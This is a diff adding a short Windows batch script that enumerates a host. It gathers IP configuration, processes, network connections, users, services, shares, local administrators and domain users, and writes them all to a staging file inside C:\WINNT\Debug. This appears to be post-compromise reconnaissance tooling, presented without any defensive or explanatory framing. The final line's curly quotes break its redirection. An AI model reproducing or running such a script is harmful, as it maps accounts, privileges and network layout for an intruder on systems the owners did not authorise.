@@ -1,0 +1,9 @@
+@echo off
+ipconfig /all >> "C:\WINNT\Debug\1.txt"
+tasklist -v >> "C:\WINNT\Debug\1.txt"
+netstat -ano >> "C:\WINNT\Debug\1.txt"
+net user  >> "C:\WINNT\Debug\1.txt"
+net start  >> "C:\WINNT\Debug\1.txt"
+net share >> "C:\WINNT\Debug\1.txt"
+net localgroup administrators >> "C:\WINNT\Debug\1.txt"
+net group "domain users" /domain>>”C:\WINNT\Debug\1.txt”
